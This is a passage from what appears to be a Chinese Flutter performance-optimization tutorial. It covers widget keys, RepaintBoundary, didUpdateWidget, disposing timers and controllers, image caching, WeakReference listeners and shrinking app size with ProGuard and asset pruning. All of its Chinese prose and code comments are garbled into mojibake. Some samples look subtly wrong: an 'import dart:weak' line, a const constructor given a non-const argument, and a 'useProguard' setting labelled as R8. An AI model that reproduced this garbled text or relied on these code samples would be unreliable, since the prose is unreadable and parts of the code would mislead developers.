  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        ElevatedButton(
          onPressed: _reverseList,
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'åè½¬åˆ—è¡¨'</span>),
        ),
        Expanded(
          child: ListView.builder(
            itemCount: items.length,
            itemBuilder: (context, index) {
              <span class="hljs-keyword">final</span> item = items[index];
              
              <span class="hljs-comment">// æƒ…å†µ1ï¼šæ²¡æœ‰Key - åè½¬æ—¶çŠ¶æ€ä¼šé”™ä¹±</span>
              <span class="hljs-comment">// return StatefulListItem(text: item);</span>
              
              <span class="hljs-comment">// æƒ…å†µ2ï¼šä½¿ç”¨indexä½œä¸ºKey - åè½¬æ—¶çŠ¶æ€é”™ä¹±</span>
              <span class="hljs-comment">// return StatefulListItem(key: ValueKey(index), text: item);</span>
              
              <span class="hljs-comment">// æƒ…å†µ3ï¼šä½¿ç”¨ValueKey - åè½¬æ—¶çŠ¶æ€ä¿æŒæ­£ç¡®</span>
              <span class="hljs-keyword">return</span> StatefulListItem(key: ValueKey(item), text: item);
            },
          ),
        ),
      ],
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StatefulListItem</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> text;
  
  <span class="hljs-keyword">const</span> StatefulListItem({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.text}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _StatefulListItemState createState() =&gt; _StatefulListItemState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_StatefulListItemState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">StatefulListItem</span>&gt; </span>{
  <span class="hljs-built_in">int</span> _counter = <span class="hljs-number">0</span>;
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ListTile(
      title: Text(<span class="hljs-string">'<span class="hljs-subst">${widget.text}</span> - ç‚¹å‡»æ¬¡æ•°: <span class="hljs-subst">$_counter</span>'</span>),
      onTap: () =&gt; setState(() =&gt; _counter++),
    );
  }
}
</code></pre>
<h4 data-id="heading-5">ä¼˜åŒ–æ‰‹æ®µ3ï¼šRepaintBoundary - éš”ç¦»é‡ç»˜åŒºåŸŸ</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„ç»˜åˆ¶å›¾å±‚ï¼Œé¿å…ä¸å¿…è¦çš„é‡ç»˜ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>é¢‘ç¹å˜åŒ–çš„ç»„ä»¶ä¸å½±å“é™æ€åŒºåŸŸ</li>
<li>å‡å°‘æ•´ä½“é‡ç»˜èŒƒå›´</li>
<li>æé«˜æ¸²æŸ“æ•ˆç‡</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>é¢‘ç¹åŠ¨ç”»çš„ç»„ä»¶</li>
<li>ç‹¬ç«‹æ»šåŠ¨çš„åˆ—è¡¨</li>
<li>è§†é¢‘æ’­æ”¾å™¨</li>
<li>æ¸¸æˆç”»å¸ƒ</li>
</ul>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RepaintBoundaryDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      body: Column(
        children: [
          <span class="hljs-comment">// é™æ€åŒºåŸŸï¼Œä¸éœ€è¦é‡ç»˜è¾¹ç•Œ</span>
          <span class="hljs-keyword">const</span> StaticHeader(),
          
          <span class="hljs-comment">// é¢‘ç¹åŠ¨ç”»åŒºåŸŸï¼Œéœ€è¦éš”ç¦»</span>
          RepaintBoundary(
            child: AnimatedClock(),
          ),
          
          <span class="hljs-comment">// é™æ€åŒºåŸŸ</span>
          <span class="hljs-keyword">const</span> StaticContent(),
          
          <span class="hljs-comment">// ç‹¬ç«‹æ»šåŠ¨çš„åˆ—è¡¨</span>
          Expanded(
            child: RepaintBoundary(
              child: ProductList(),
            ),
          ),
        ],
      ),
    );
  }
}
</code></pre>
<p><strong>æ³¨æ„ç‚¹</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªRepaintBoundaryéƒ½æœ‰å†…å­˜å’Œæ€§èƒ½å¼€é”€</li>
<li>ä¸è¦è¿‡åº¦ä½¿ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æ·±åº¦åµŒå¥—ä¸­</li>
<li>ä¼˜å…ˆéš”ç¦»é¢‘ç¹å˜åŒ–çš„å°åŒºåŸŸ</li>
</ul>
<h4 data-id="heading-6">ä¼˜åŒ–æ‰‹æ®µ4ï¼šdidUpdateWidget - ä¸¥æ ¼æ§åˆ¶æ›´æ–°</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šStatefulWidgetæ›´æ–°æ—¶çš„å›è°ƒï¼Œå¯ä»¥ç²¾ç¡®æ§åˆ¶å“ªäº›å˜åŒ–éœ€è¦é‡å»ºã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>é¿å…ä¸å¿…è¦çš„setStateè°ƒç”¨</li>
<li>å¯ä»¥åªæ›´æ–°çœŸæ­£å˜åŒ–çš„éƒ¨åˆ†</li>
<li>å‡å°‘é‡å»ºèŒƒå›´</li>
</ul>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmartWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> title;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; data;
  
  <span class="hljs-keyword">const</span> SmartWidget({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.title, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.data})
      : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _SmartWidgetState createState() =&gt; _SmartWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SmartWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SmartWidget</span>&gt; </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-built_in">String</span> _currentTitle;
  <span class="hljs-keyword">late</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; _currentData;
  <span class="hljs-built_in">String?</span> _computedResult;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _currentTitle = widget.title;
    _currentData = widget.data;
    _computeResult();
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(SmartWidget oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    
    <span class="hljs-comment">// åªæœ‰titleå˜åŒ–æ—¶æ‰é‡å»ºUI</span>
    <span class="hljs-keyword">if</span> (widget.title != _currentTitle) {
      _currentTitle = widget.title;
      setState(() {});
    }
    
    <span class="hljs-comment">// dataå˜åŒ–æ—¶é‡æ–°è®¡ç®—ï¼Œä½†ä¸ä¸€å®šéœ€è¦é‡å»ºUI</span>
    <span class="hljs-keyword">if</span> (!_listEquals(widget.data, _currentData)) {
      _currentData = widget.data;
      _computeResult();
      <span class="hljs-comment">// è¿™é‡Œä¸è°ƒç”¨setStateï¼Œå› ä¸º_computedResultå¯èƒ½è¢«å…¶ä»–Widgetä½¿ç”¨</span>
    }
  }
  
  <span class="hljs-keyword">void</span> _computeResult() {
    _computedResult = <span class="hljs-string">'è®¡ç®—ç»“æœ: <span class="hljs-subst">${widget.data.length}</span>'</span>;
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Container(
      child: Column(
        children: [
          Text(_currentTitle),
          <span class="hljs-keyword">if</span> (_computedResult != <span class="hljs-keyword">null</span>) Text(_computedResult!),
        ],
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-7">äºŒã€ä¼˜åŒ–å†…å­˜</h3>
<h4 data-id="heading-8">Flutterå†…å­˜æ³„æ¼çš„æ ¹æºï¼Ÿ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[å†…å­˜æ³„æ¼] --&gt; B[æœªé‡Šæ”¾çš„è®¢é˜…]
    A --&gt; C[æœªå–æ¶ˆçš„Timer]
    A --&gt; D[æœªdisposeçš„Controller]
    A --&gt; E[å¾ªç¯å¼•ç”¨]
    A --&gt; F[å¤§å¯¹è±¡æœªåŠæ—¶é‡Šæ”¾]
    
    G[æ³„æ¼å½±å“] --&gt; H[å†…å­˜æŒç»­å¢é•¿]
    G --&gt; I[OOMå´©æºƒ]
    G --&gt; J[åº”ç”¨è¢«ç³»ç»Ÿç»ˆæ­¢]
    G --&gt; K[ç”¨æˆ·ä½“éªŒå·®]
</code></pre>
<h4 data-id="heading-9">ä¼˜åŒ–æ‰‹æ®µ1ï¼šç®¡ç†èµ„æºç”Ÿå‘½å‘¨æœŸ</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šç¡®ä¿æ‰€æœ‰éœ€è¦æ‰‹åŠ¨é‡Šæ”¾çš„èµ„æºéƒ½è¢«æ­£ç¡®é‡Šæ”¾ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>Dartæœ‰åƒåœ¾å›æ”¶ï¼Œä½†æŸäº›èµ„æºéœ€è¦æ‰‹åŠ¨ç®¡ç†</li>
<li>æœªé‡Šæ”¾çš„èµ„æºä¼šå¯¼è‡´å†…å­˜æ³„æ¼</li>
<li>è®¢é˜…å’Œç›‘å¬å™¨å¯èƒ½æŒæœ‰Widgetå¼•ç”¨</li>
</ul>
<p><strong>éœ€è¦ç®¡ç†çš„èµ„æºç±»å‹</strong>ï¼š</p>
<ol>
<li>StreamSubscription</li>
<li>Timer</li>
<li>ScrollController/TextEditingController</li>
<li>AnimationController</li>
<li>FocusNode</li>
<li>ImageStream</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å…¸å‹çš„å†…å­˜æ³„æ¼</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeakyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _LeakyWidgetState createState() =&gt; _LeakyWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LeakyWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LeakyWidget</span>&gt; </span>{
  StreamSubscription? _subscription;
  Timer? _timer;
  ScrollController _controller = ScrollController();
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    <span class="hljs-comment">// è®¢é˜…Stream</span>
    _subscription = Stream.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>))
        .listen((_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'tick'</span>));
    
    <span class="hljs-comment">// å¯åŠ¨Timer</span>
    _timer = Timer.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>), (_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'timer'</span>));
    
    <span class="hljs-comment">// æ·»åŠ ç›‘å¬å™¨</span>
    _controller.addListener(() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'scrolling'</span>));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// å¿˜è®°å–æ¶ˆå’Œé‡Šæ”¾</span>
    <span class="hljs-comment">// _subscription?.cancel();</span>
    <span class="hljs-comment">// _timer?.cancel();</span>
    <span class="hljs-comment">// _controller.dispose();</span>
    
    <span class="hljs-keyword">super</span>.dispose();
  }
}

<span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼š</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SafeWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _SafeWidgetState createState() =&gt; _SafeWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SafeWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SafeWidget</span>&gt; </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> StreamSubscription _subscription;
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> Timer _timer;
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> ScrollController _controller;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    _controller = ScrollController();
    _controller.addListener(_onScroll);
    
    _subscription = Stream.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>))
        .listen(_onTick);
    
    _timer = Timer.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>), _onTimer);
  }
  
  <span class="hljs-keyword">void</span> _onTick(_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'tick'</span>);
  <span class="hljs-keyword">void</span> _onTimer(_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'timer'</span>);
  <span class="hljs-keyword">void</span> _onScroll() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'scrolling'</span>);
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// æŒ‰åˆ›å»ºé¡ºåºçš„é€†åºé‡Šæ”¾</span>
    _timer.cancel();
    _subscription.cancel();
    _controller.dispose();
    
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h4 data-id="heading-10">ä¼˜åŒ–æ‰‹æ®µ2ï¼šå¤§å¯¹è±¡ç®¡ç†</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šé’ˆå¯¹å›¾åƒã€åˆ—è¡¨ç­‰å¤§å†…å­˜å¯¹è±¡è¿›è¡Œç‰¹æ®Šç®¡ç†ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>å›¾åƒæ˜¯ç§»åŠ¨åº”ç”¨å†…å­˜çš„æœ€å¤§å ç”¨è€…</li>
<li>ä¸å½“çš„å›¾åƒåŠ è½½ä¼šå¯¼è‡´OOM</li>
<li>åˆ—è¡¨æ•°æ®å¯èƒ½å ç”¨å¤§é‡å†…å­˜</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>ï¼š</p>
<ol>
<li>å›¾åƒå‹ç¼©å’Œç¼“å­˜</li>
<li>åˆ—è¡¨åˆ†é¡µåŠ è½½</li>
<li>å¯¹è±¡æ± å¤ç”¨</li>
<li>æ‡’åŠ è½½å’Œé¢„åŠ è½½å¹³è¡¡</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¼˜åŒ–å›¾åƒå†…å­˜</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageMemoryOptimizer</span> </span>{
  <span class="hljs-comment">// 1. ä½¿ç”¨æ­£ç¡®çš„å›¾åƒå°ºå¯¸</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedImage(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> Image.network(
      url,
      width: <span class="hljs-number">100</span>,  
      height: <span class="hljs-number">100</span>,
      fit: BoxFit.cover,
      cacheWidth: <span class="hljs-number">200</span>,  
      cacheHeight: <span class="hljs-number">200</span>,
    );
  }
  
  <span class="hljs-comment">// 2. ä½¿ç”¨ç¼“å­˜ç­–ç•¥</span>
  <span class="hljs-keyword">static</span> Widget buildCachedImage(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> CachedNetworkImage(
      imageUrl: url,
      placeholder: (context, url) =&gt; CircularProgressIndicator(),
      errorWidget: (context, url, error) =&gt; Icon(Icons.error),
      width: <span class="hljs-number">100</span>,
      height: <span class="hljs-number">100</span>,
      fit: BoxFit.cover,
      memCacheWidth: <span class="hljs-number">200</span>,  
      memCacheHeight: <span class="hljs-number">200</span>,
      maxWidthDiskCache: <span class="hljs-number">400</span>,  
      maxHeightDiskCache: <span class="hljs-number">400</span>,
    );
  }
  
  <span class="hljs-comment">// 3. ç®¡ç†å›¾ç‰‡é¢„åŠ è½½</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, ImageProvider&gt; _preloadedImages = {};
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; preloadImage(<span class="hljs-built_in">String</span> url) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_preloadedImages.containsKey(url)) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">final</span> completer = Completer&lt;<span class="hljs-keyword">void</span>&gt;();
    <span class="hljs-keyword">final</span> imageProvider = NetworkImage(url);
    
    <span class="hljs-comment">// é¢„åŠ è½½åˆ°ç¼“å­˜</span>
    <span class="hljs-keyword">final</span> stream = imageProvider.resolve(ImageConfiguration.empty);
    <span class="hljs-keyword">final</span> listener = ImageStreamListener((info, <span class="hljs-keyword">sync</span>) {
      _preloadedImages[url] = imageProvider;
      completer.complete();
    });
    
    stream.addListener(listener);
    <span class="hljs-keyword">await</span> completer.future;
    stream.removeListener(listener);
  }
}

<span class="hljs-comment">// ä¼˜åŒ–åˆ—è¡¨å†…å­˜</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListMemoryOptimizer</span> </span>{
  <span class="hljs-comment">// 1. åˆ†é¡µåŠ è½½</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">List</span>&lt;Item&gt;&gt; loadItems(<span class="hljs-built_in">int</span> page, <span class="hljs-built_in">int</span> pageSize) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> start = page * pageSize;
    <span class="hljs-keyword">final</span> end = start + pageSize;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _fetchItems(start, end);
  }
  
  <span class="hljs-comment">// 2. é‡ç”¨åˆ—è¡¨é¡¹</span>
  <span class="hljs-keyword">static</span> Widget buildReusableListItem(Item item) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> ReusableListItem(item: item);
  }
}
</code></pre>
<h4 data-id="heading-11">ä¼˜åŒ–æ‰‹æ®µ3ï¼šWeakReferenceä½¿ç”¨</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šå¼±å¼•ç”¨å…è®¸å¯¹è±¡è¢«åƒåœ¾å›æ”¶ï¼Œå³ä½¿è¿˜æœ‰å¼•ç”¨æŒ‡å‘å®ƒã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>æ‰“ç ´å¾ªç¯å¼•ç”¨</li>
<li>é¿å…å› ç›‘å¬å™¨å¯¼è‡´çš„å†…å­˜æ³„æ¼</li>
<li>å…è®¸ç¼“å­˜è¢«è‡ªåŠ¨æ¸…ç†</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶ç›‘å¬å™¨</li>
<li>ç¼“å­˜å®ç°</li>
<li>è§‚å¯Ÿè€…æ¨¡å¼</li>
</ul>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä½¿ç”¨å¼±å¼•ç”¨çš„äº‹ä»¶ç®¡ç†å™¨</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:weak'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventManager</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;WeakReference&lt;EventListener&gt;&gt; _listeners = [];
  
  <span class="hljs-keyword">void</span> addListener(EventListener listener) {
    _listeners.add(WeakReference(listener));
  }
  
  <span class="hljs-keyword">void</span> notify(<span class="hljs-built_in">String</span> event) {
    <span class="hljs-comment">// æ¸…ç†è¢«å›æ”¶çš„ç›‘å¬å™¨</span>
    _listeners.removeWhere((ref) =&gt; ref.target == <span class="hljs-keyword">null</span>);
    
    <span class="hljs-comment">// é€šçŸ¥å­˜æ´»çš„ç›‘å¬å™¨</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> ref <span class="hljs-keyword">in</span> _listeners) {
      ref.target?.onEvent(event);
    }
  }
}

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventListener</span> </span>{
  <span class="hljs-keyword">void</span> onEvent(<span class="hljs-built_in">String</span> event);
}

<span class="hljs-comment">// å…·ä½“ä½¿ç”¨</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _MyWidgetState createState() =&gt; _MyWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyWidget</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">EventListener</span> </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> EventManager _eventManager;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _eventManager = EventManager();
    _eventManager.addListener(<span class="hljs-keyword">this</span>); 
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onEvent(<span class="hljs-built_in">String</span> event) {
    <span class="hljs-keyword">if</span> (mounted) {
      setState(() {
        <span class="hljs-comment">// å¤„ç†äº‹ä»¶...</span>
      });
    }
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// ä¸éœ€è¦æ‰‹åŠ¨ç§»é™¤ç›‘å¬å™¨</span>
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h3 data-id="heading-12">ä¸‰ã€ä¼˜åŒ–åŒ…ä½“ç§¯</h3>
<h4 data-id="heading-13">åŒ…ä½“ç§¯ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[åŒ…ä½“ç§¯è¿‡å¤§çš„å½±å“] --&gt; B[ä¸‹è½½é‡ä¸‹é™]
    A --&gt; C[å­˜å‚¨ç©ºé—´å ç”¨]
    A --&gt; D[æ›´æ–°é¢‘ç‡é™ä½]
    A --&gt; E[ä½ç«¯è®¾å¤‡ä½“éªŒå·®]
    
    F[ä½“ç§¯æ„æˆåˆ†æ] --&gt; G[ç¬¬ä¸€ä½:èµ„æºæ–‡ä»¶]
    F --&gt; H[ç¬¬äºŒä½:Flutterå¼•æ“]
    F --&gt; I[ç¬¬ä¸‰ä½:Dartä»£ç ]
    F --&gt; J[ç¬¬å››ä½:ä¸‰æ–¹åº“]
</code></pre>
<h4 data-id="heading-14">ä¼˜åŒ–æ‰‹æ®µ1ï¼šä¼˜åŒ–èµ„æºæ–‡ä»¶</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šå‡å°‘å›¾ç‰‡ã€å­—ä½“ç­‰èµ„æºæ–‡ä»¶çš„å¤§å°ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>èµ„æºæ–‡ä»¶é€šå¸¸å ç”¨æœ€å¤§ä½“ç§¯</li>
<li>æœªä½¿ç”¨çš„èµ„æºç™½ç™½å ç”¨ç©ºé—´</li>
<li>æœªä¼˜åŒ–çš„èµ„æºåŠ è½½æ…¢</li>
</ul>
<p><strong>ä¼˜åŒ–æ‰‹æ®µ</strong>ï¼š</p>
<ol>
<li>åˆ é™¤æœªä½¿ç”¨èµ„æº</li>
<li>å‹ç¼©å›¾ç‰‡æ ¼å¼</li>
<li>å­—ä½“å­é›†åŒ–</li>
<li>æŒ‰éœ€åŠ è½½å¤§èµ„æº</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yamlä¼˜åŒ–ç¤ºä¾‹</span>
<span class="hljs-attr">flutter:</span>
  <span class="hljs-attr">assets:</span>
    <span class="hljs-comment"># ä¸è¦å¯¼å…¥æ•´ä¸ªç›®å½•</span>
    <span class="hljs-comment"># - assets/images/</span>
    
    <span class="hljs-comment"># ç²¾ç¡®æŒ‡å®šéœ€è¦çš„æ–‡ä»¶</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/icon.png</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/logo.png</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/splash.png</span>
    
    <span class="hljs-comment"># ä½¿ç”¨WebPæ ¼å¼</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/background.webp</span>
    
  <span class="hljs-attr">fonts:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">family:</span> <span class="hljs-string">NotoSans</span>
      <span class="hljs-attr">fonts:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">asset:</span> <span class="hljs-string">assets/fonts/NotoSans-Regular.ttf</span>
          <span class="hljs-comment"># åªåŒ…å«éœ€è¦çš„å­—ä½“</span>
          <span class="hljs-comment"># - asset: assets/fonts/NotoSans-Bold.ttf</span>
          <span class="hljs-comment">#   weight: 700</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># èµ„æºä¼˜åŒ–å¸¸ç”¨çš„ç»ˆç«¯å‘½ä»¤ï¼š</span>
<span class="hljs-comment"># 1. æŸ¥æ‰¾å¤§æ–‡ä»¶</span>
find . -name <span class="hljs-string">"*.png"</span> -size +100k -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -lh {} \;

<span class="hljs-comment"># 2. è½¬æ¢ä¸ºWebP</span>
cwebp -q 80 input.png -o output.webp

<span class="hljs-comment"># 3. å­—ä½“å­é›†åŒ–</span>
pyftsubset font.ttf --text-file=chinese_chars.txt
</code></pre>
<h4 data-id="heading-15">ä¼˜åŒ–æ‰‹æ®µ2ï¼šä»£ç æ··æ·†</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šé€šè¿‡æ··æ·†ã€å‹ç¼©å’Œä¼˜åŒ–å‡å°‘ä»£ç ä½“ç§¯ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>ç§»é™¤æœªä½¿ç”¨çš„ä»£ç </li>
<li>ç¼©çŸ­æ ‡è¯†ç¬¦åç§°</li>
<li>ä¼˜åŒ–æ§åˆ¶æµ</li>
</ul>
<p><strong>ä¼˜åŒ–å·¥å…·</strong>ï¼š</p>
<ol>
<li>R8/ProGuardï¼ˆAndroidï¼‰</li>
<li>Dartç¼–è¯‘ä¼˜åŒ–</li>
<li>Tree Shaking</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-gradle" lang="gradle">// android/app/build.gradle
android {
    buildTypes {
        release {
            // å¯ç”¨ä»£ç ä¼˜åŒ–
            minifyEnabled true
            shrinkResources true
            
            // ä½¿ç”¨R8
            useProguard true
            
            proguardFiles getDefaultProguardFile(
                'proguard-android-optimize.txt'
            ), 'proguard-rules.pro'
        }
    }
}
</code></pre>
<pre><code class="hljs language-pro" lang="pro"># proguard-rules.pro
# ä¿ç•™Flutterå¿…è¦ç±»
-keep class io.flutter.app.** { *; }
-keep class io.flutter.plugin.** { *; }

# ç§»é™¤æ—¥å¿—
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
</code></pre>
<h4 data-id="heading-16">ä¼˜åŒ–æ‰‹æ®µ3ï¼šæŒ‰éœ€åŠ è½½ä¸å»¶è¿Ÿå¯¼å…¥</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šå°†åº”ç”¨æ‹†åˆ†ä¸ºå¤šä¸ªæ¨¡å—ï¼ŒæŒ‰éœ€åŠ è½½ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
